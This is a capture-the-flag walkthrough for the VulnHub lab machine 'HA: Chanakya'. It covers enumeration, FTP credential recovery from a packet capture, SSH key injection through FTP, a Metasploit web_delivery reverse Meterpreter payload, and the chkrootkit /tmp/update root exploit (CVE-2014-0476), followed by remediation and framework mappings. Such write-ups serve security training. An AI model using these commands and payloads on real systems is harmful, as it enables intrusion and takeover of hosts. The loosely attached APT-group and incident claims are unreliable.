# HA: Chanakya — The Strategist's Hidden Secrets

Chanakya (Kautilya) was ancient India's greatest political strategist: author of the Arthashastra, mentor of Emperor Chandragupta Maurya, and architect of layered deception. This machine pays homage perfectly. The path to root here runs through encoded hints, cleartext FTP credentials in a packet capture, and a chkrootkit local exploit that punishes blind trust in a security tool run as root. Classic misdirection. Big brain stuff, dude.

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | HA: Chanakya |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/ha-chanakya,395/ |
| **Techniques** | Nmap service enumeration, web directory brute-force, ROT13 decode, Wireshark FTP stream analysis, SSH key injection via FTP, Metasploit web_delivery, chkrootkit local privilege escalation |
| **CVEs** | CVE-2014-0476 (chkrootkit local privilege escalation via /tmp/update) |
| **APT Groups** | APT41: uses cleartext credential interception and living-off-the-land escalation binaries in enterprise Linux attacks; Lazarus Group: leverages misconfigured security tooling and cron-based escalation paths in targeted intrusions |

---

## Attack Summary

```
nmap → FTP (21), SSH (22), HTTP (80)
  → dirb -X .txt → /abuse.txt (ROT13 encoded)
  → ROT13 decode → ashoka.pcapng
  → wget ashoka.pcapng → Wireshark FTP stream
  → creds: ashoka:kautilya
  → ftp login → mkdir .ssh → upload authorized_keys
  → ssh -i ashoka_key ashoka@target
  → /tmp/logs shows chkrootkit running as root (cron)
  → Metasploit web_delivery → Meterpreter session
  → exploit/unix/local/chkrootkit → uid=0(root)
  → cat /root/final.txt
```

---

## Methodology

1. Full port scan to identify FTP, SSH, and HTTP services
2. Web directory brute-force with extension filter to find encoded hint file
3. ROT13 decode of hint to discover packet capture filename
4. Wireshark FTP stream analysis to recover cleartext credentials
5. FTP write access to inject SSH public key into user home directory
6. SSH login and enumeration of chkrootkit cron activity
7. Metasploit web_delivery to establish Meterpreter session
8. chkrootkit local exploit via Metasploit for root escalation

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Three services: FTP always deserves immediate anonymous access testing. SSH is the lateral movement target. HTTP is the primary enumeration surface. The FTP banner should be noted: vsftpd version matters for potential vulnerability research.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Directory Brute-Force and ROT13 Decode

Browse to `http://192.168.1.101/` first, inspect source. Nothing obvious. Run dirb with `.txt` extension:

```bash
dirb http://192.168.1.101/ -X .txt
```

Discovers `/abuse.txt`. Read it:

```bash
curl http://192.168.1.101/abuse.txt
# Output looks scrambled — it is ROT13 encoded
```

Decode:

```bash
curl -s http://192.168.1.101/abuse.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Output: ashoka.pcapng
```

Download the packet capture:

```bash
wget http://192.168.1.101/ashoka.pcapng
```

**Real-world note:** ROT13 is not encryption. It is a substitution cipher from the Roman era that requires zero computational effort to reverse. Any attacker who finds the file can immediately read it. Organizations should never use encoding as a security control. APT41 routinely discovers exposed configuration and hint files during initial web enumeration phases.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1027 — Obfuscated Files or Information

---

## Step 3 — Wireshark FTP Stream Analysis

Open the packet capture:

```bash
wireshark ashoka.pcapng
```

Apply display filter: `ftp`

Follow the TCP stream on the FTP conversation. FTP transmits all data, including authentication, in cleartext over the wire:

```
220 (vsFTPd 3.0.3)
USER ashoka
331 Please specify the password.
PASS kautilya
230 Login successful.
```

Recovered credentials: `ashoka:kautilya`

**Alternatively, use tshark from CLI:**

```bash
tshark -r ashoka.pcapng -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null
```

**Real-world note:** FTP was designed in 1971, before the existence of adversarial networks. Every byte transmitted, including passwords, is visible to anyone on the same network segment. Wireshark filter `ftp` on any captured traffic in a corporate LAN will surface FTP credentials within seconds. This is why FTP has been deprecated in enterprise security frameworks for over a decade.

**MITRE ATT&CK:** T1552.001 — Credentials in Files; T1040 — Network Sniffing

---

## Step 4 — FTP Write Access and SSH Key Injection

Login to FTP with recovered credentials:

```bash
ftp 192.168.1.101
# Username: ashoka
# Password: kautilya
ftp> ls -la
```

Check if write access exists to the home directory. Generate an SSH key pair on the attacker:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/ashoka_key -N ""
# Creates: /tmp/ashoka_key (private) and /tmp/ashoka_key.pub (public)
```

In the FTP session, create `.ssh` directory and upload the public key:

```bash
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put /tmp/ashoka_key.pub authorized_keys
ftp> quit
```

SSH into the machine using the private key:

```bash
ssh -i /tmp/ashoka_key ashoka@192.168.1.101
```

Explore the system. Check for scheduled tasks:

```bash
cat /tmp/logs
ls -la /tmp/
crontab -l
sudo cat /etc/crontab
```

`/tmp/logs` contains chkrootkit output, revealing it runs periodically as root via cron. This is the privilege escalation path.

**Real-world note:** FTP write access to a user's home directory is functionally equivalent to shell access. By writing an `authorized_keys` file, the attacker bypasses any password requirement for SSH. This attack chain (FTP write + SSH key injection) was used in multiple cloud server compromises in 2019-2021 where misconfigured vsftpd instances exposed user home directories.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1098.004 — Account Manipulation: SSH Authorized Keys

---

## Step 5 — Metasploit web_delivery for Meterpreter

On the attacker machine, set up a Metasploit web_delivery handler to receive a Meterpreter session from the `ashoka` shell:

```bash
msfconsole -q
use exploit/multi/script/web_delivery
set TARGET 7
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.103
set LPORT 4444
run
```

Metasploit outputs a one-liner command. Run it from the `ashoka` SSH session:

```bash
# Paste and run the generated command from Metasploit
python3 -c "import urllib.request,os,pty;..."
```

Back in Metasploit, a session opens. Background it:

```bash
sessions -l
# Note session ID
background
```

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 6 — chkrootkit Local Privilege Escalation

The chkrootkit local exploit (CVE-2014-0476) abuses the fact that chkrootkit version 0.49 and earlier execute `/tmp/update` as root when running the `slapper` check. If cron runs chkrootkit as root, placing a malicious `/tmp/update` yields root code execution.

Use the Metasploit module:

```bash
use exploit/unix/local/chkrootkit
set SESSION <meterpreter_session_id>
set LHOST 192.168.1.103
set LPORT 5555
run
```

Metasploit creates `/tmp/update` with a reverse shell payload and waits for chkrootkit to execute it. When cron fires:

```
[*] Waiting for chkrootkit to run via cron...
[*] Meterpreter session 3 opened
```

Confirm root:

```bash
getuid
# Server username: uid=0, gid=0, euid=0, egid=0
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/final.txt
```

**Real-world note:** Security tools that run as root and execute scripts from world-writable directories (`/tmp`) create the exact attack surface they are meant to detect. The irony is intentional in this VM's design. In real environments, Tripwire, OSSEC, and chkrootkit have all had similar trust-boundary bugs. The principle: security tools need the same hardening as the systems they protect.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid; T1053.003 — Scheduled Task: Cron; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential | ashoka:kautilya | FTP cleartext (Wireshark ashoka.pcapng) | FTP login, SSH key injection |
| User shell | ashoka | SSH via injected key | Initial foothold |
| Root flag | /root/final.txt | chkrootkit CVE-2014-0476 escalation | Full compromise |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | ROT13-encoded credential hint in public web directory | Information disclosure via weak obfuscation; classified in OWASP A05 Security Misconfiguration | Never place sensitive hints in publicly accessible paths; encoding is not encryption |
| 2 | FTP transmits credentials in cleartext | Any network observer can capture FTP credentials with basic packet analysis tools | Replace FTP with SFTP or SCP; disable FTP entirely if not required; enforce TLS if FTP must remain |
| 3 | FTP write access to user home directory equals SSH access | Attackers who can write to `~/.ssh/authorized_keys` bypass all password controls | Apply strict FTP chroot with read-only permissions; never expose home directories via FTP |
| 4 | chkrootkit executes `/tmp/update` as root | Security tools with improper privilege separation become escalation vectors themselves | Update chkrootkit to patched version; mount `/tmp` with `noexec`; run security tools from read-only paths as non-root where possible |
| 5 | Cron job reveals escalation path via /tmp/logs | Log files left in world-readable locations expose system internals to low-privilege users | Restrict log output to privileged paths; minimize information disclosure to unprivileged users |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Credential Access | Network Sniffing | T1040 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Persistence | Persistence | Account Manipulation: SSH Authorized Keys | T1098.004 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Scheduled Task: Cron | T1053.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove sensitive files from web-accessible paths**: no encoded hints, no packet captures, no credential references under the web root
2. **Replace FTP with SFTP**: configure OpenSSH with SFTP subsystem; disable vsftpd; enforce key-based authentication
3. **Restrict FTP home directory access**: if FTP is required, apply chroot jails and read-only permissions; never expose `.ssh/` via FTP
4. **Update chkrootkit**: patch to version 0.50+; restrict `/tmp` with `noexec` mount option; run chkrootkit as non-root where possible
5. **Audit cron jobs**: `cat /etc/crontab`; `ls -la /etc/cron*`; ensure no privileged cron jobs execute scripts from world-writable paths
6. **Restrict log output paths**: move tool output from `/tmp/logs` to privileged directories; apply file permissions accordingly

### MITRE D3FEND Countermeasures

- **D3-NTF** — Network Traffic Filtering (block FTP; enforce SFTP only)
- **D3-ACH** — Application Configuration Hardening (chkrootkit path hardening; noexec /tmp)
- **D3-OAM** — Operating System Administrative Management (cron job auditing; privilege separation)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP services; audit cron jobs with privileged execution |
| Protect | Access Control | Disable FTP; enforce SFTP with key authentication; restrict home directory writes |
| Protect | Data Security | Remove sensitive files from web root; no credential hints in public paths |
| Detect | Anomalies and Events | Alert on FTP connections; monitor /tmp for new executable files |
| Respond | Response Planning | Disable FTP immediately; rotate all exposed credentials; audit authorized_keys across all users |
| Recover | Recovery Planning | Rebuild from known-good snapshot; audit all cron-executed binaries |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | FTP access controls; restrict home directory write via FTP |
| AC-6 | Least Privilege | chkrootkit should not run as root; cron jobs use dedicated service accounts |
| IA-5 | Authenticator Management | Rotate all credentials found via packet capture; disable FTP password auth |
| CM-7 | Least Functionality | Disable vsftpd if not required; remove unnecessary services |
| SC-8 | Transmission Confidentiality and Integrity | Replace FTP (cleartext) with SFTP (encrypted) |
| SI-2 | Flaw Remediation | Patch chkrootkit to version 0.50+ |

### CISA KEV

CVE-2014-0476 (chkrootkit local privilege escalation) affects systems running unpatched chkrootkit as root via cron. CISA Alerts AA21-265A and AA22-074A reference living-off-the-land escalation via misconfigured security tooling. Organizations are advised to audit all security tools running with elevated privileges for similar trust-boundary issues.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL2 |

---

## Final Thoughts

HA: Chanakya delivers a masterclass in layered misdirection, just like the historical figure himself. The Arthashastra teaches that the strongest fortress has multiple gates, each requiring different knowledge to pass. This machine implements exactly that: web enumeration, packet analysis, FTP write access, Meterpreter delivery, and finally exploiting the very tool meant to detect compromise. gg no cap.

Chanakya famously said: "Before you start some work, always ask yourself three questions: Why am I doing it, what the results might be, and will I be successful?" In pentesting: enumerate before exploiting, understand the chain before you pull it.

Thanks guys!! (❍ᴥ❍ʋ)
